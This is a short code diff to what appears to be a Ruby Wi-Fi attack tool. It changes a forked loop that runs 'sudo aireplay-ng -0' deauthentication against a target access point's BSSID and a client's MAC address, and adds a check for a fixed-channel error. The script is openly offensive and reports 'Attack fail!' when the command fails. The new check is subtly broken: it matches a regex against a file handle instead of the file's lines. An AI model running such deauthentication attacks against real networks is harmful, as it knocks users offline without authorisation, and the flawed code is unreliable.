@@ -29,11 +29,15 @@ def aireplay_runner stations = Array.new
 		fork do 
 			sleep(0.5)
 			2.times do
-				if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0 > replay_output.csv")
-					system("cp replay_output.csv ..")
+				if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0 > replay_output.txt")
 					monitoring_stopper()
 					cleaner()
 					abort("\nAttack fail!")
+				end
+				File.open("replay_output.txt", "r") do |line|
+					if line =~ /channel -1/
+						abort("Error: Fixed channel -1!")
+					end
 				end
 				sleep(2)
 			end
